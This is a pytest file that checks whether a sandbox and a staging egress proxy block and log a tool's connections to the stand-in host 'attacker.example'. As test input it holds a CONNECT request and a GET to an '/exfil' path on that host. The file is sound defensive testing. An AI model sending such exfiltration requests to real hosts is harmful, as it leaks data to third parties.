"""E15.3-T07 egress (#137): a bundle's tool that calls `attacker.example` is blocked and logged, in
the CubeSandbox test run and in the Staging runtime. No Docker or VM is needed.

* Sandbox (E13.2): the real `execute` with the E13.2 fake backend. The VM is given only the pinned
  allowlist (`attacker.example` is neither in `allow_out` nor resolvable from the hosts file); the
  host's evidence of the blocked connection makes the run EGRESS_BLOCKED, names the target in the
  findings (the build dashboard's log of the run) and is kept with the run's evidence.
* Staging (WG-17): the real egress proxy on loopback with the policy of a certified manifest that
  declares only `api.example.com`: CONNECT and plain HTTP to `attacker.example` get 403, nothing is
  dialled, and the block is logged with the deployment and the host.
"""

import asyncio
import base64
import logging
import sys
import uuid
from pathlib import Path

import pytest
from sbam_contracts.sandbox import EgressEvent, EgressSource, EgressVerdict, FailureCategory

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "unit"))

from sbam_api.staging.egress import EgressPolicy
from sbam_workers.staging.egress_proxy import EgressProxy, PolicyDir
from test_e13_2_executor import NOW, FakeBackend, good_outputs, run

ATTACKER = "attacker.example"


# --- CubeSandbox test run ---------------------------------------------------------------------


async def attacker_blocked(vm_id: str) -> list[EgressEvent]:
    """What the host's collector saw: the tool's connection to attacker.example, dropped."""
    return [
        EgressEvent(
            vm_id=vm_id,
            at=NOW,
            dst_host=ATTACKER,
            dst_port=443,
            verdict=EgressVerdict.BLOCK,
            source=EgressSource.L7_PROXY,
        )
    ]


def test_e15_3_t07_sandbox_tool_call_to_attacker_example_is_egress_blocked() -> None:
    backend = FakeBackend()
    backend.outputs = good_outputs(passed=False)  # the tool's call failed, so a case failed

    result = run(backend, egress_reader=attacker_blocked)

    assert result.classified.category is FailureCategory.EGRESS_BLOCKED
    assert [e.dst_host for e in result.classified.blocked_egress] == [ATTACKER]
    assert [e.dst_host for e in result.egress] == [ATTACKER]  # kept as the run's evidence
    blocked = [f for f in result.classified.findings() if f.code == "EGRESS_BLOCKED"]
    assert [f.message for f in blocked] == [f"a connection to {ATTACKER}:443 was blocked"]
    # the VM could never have reached it: not allowed out, not in its hosts file
    [spec] = backend.created
    assert set(spec.allow_out) == {"93.184.216.34", "203.0.113.9"}
    assert ATTACKER.encode() not in backend.system_written["/etc/hosts"]
    assert backend.destroyed  # and the VM is gone


# --- Staging runtime --------------------------------------------------------------------------


def test_e15_3_t07_staging_policy_blocks_attacker_example_and_logs_it(
    caplog: pytest.LogCaptureFixture,
) -> None:
    policy = EgressPolicy(["api.example.com"])  # the manifest's ui_bundle.allowed_hosts

    for host in (ATTACKER, f"{ATTACKER}:443", "ATTACKER.example.", f"api.example.com.{ATTACKER}"):
        assert not policy.check(host, deployment="stg-t07").allowed

    assert f"host={ATTACKER}" in caplog.text and "deployment=stg-t07" in caplog.text


def _auth(token: str) -> str:
    return "Proxy-Authorization: Basic " + base64.b64encode(f"{token}:".encode()).decode()


def test_e15_3_t07_staging_proxy_refuses_attacker_example_and_dials_nothing(
    tmp_path: Path, caplog: pytest.LogCaptureFixture, monkeypatch: pytest.MonkeyPatch
) -> None:
    policies = PolicyDir(tmp_path)
    token = uuid.uuid4().hex
    policies.write(token, "stg-t07", ["api.example.com"])
    dialled: list[object] = []

    async def no_dial(*args: object, **kwargs: object) -> object:
        dialled.append(args)
        raise AssertionError("the proxy dialled out for a blocked host")

    connect = asyncio.open_connection  # the test's own client keeps the real one

    async def scenario() -> list[bytes]:
        server = await asyncio.start_server(EgressProxy(policies).handle, "127.0.0.1", 0)
        port = server.sockets[0].getsockname()[1]
        answers = []
        async with server:
            for request in (
                f"CONNECT {ATTACKER}:443 HTTP/1.1\r\n{_auth(token)}\r\n\r\n",
                f"GET http://{ATTACKER}/exfil?k=v HTTP/1.1\r\nHost: {ATTACKER}\r\n"
                f"{_auth(token)}\r\n\r\n",
            ):
                reader, writer = await connect("127.0.0.1", port)
                writer.write(request.encode())
                await writer.drain()
                answers.append(await asyncio.wait_for(reader.read(4096), 5))
                writer.close()
        return answers

    monkeypatch.setattr(asyncio, "open_connection", no_dial)  # what the proxy would dial with
    caplog.set_level(logging.INFO)
    answers = asyncio.run(scenario())

    for answer in answers:
        assert answer.startswith(b"HTTP/1.1 403"), answer
        assert f"{ATTACKER} is not allowed".encode() in answer
    assert dialled == []
    assert caplog.text.count(f"host={ATTACKER}") == 2 and "deployment=stg-t07" in caplog.text
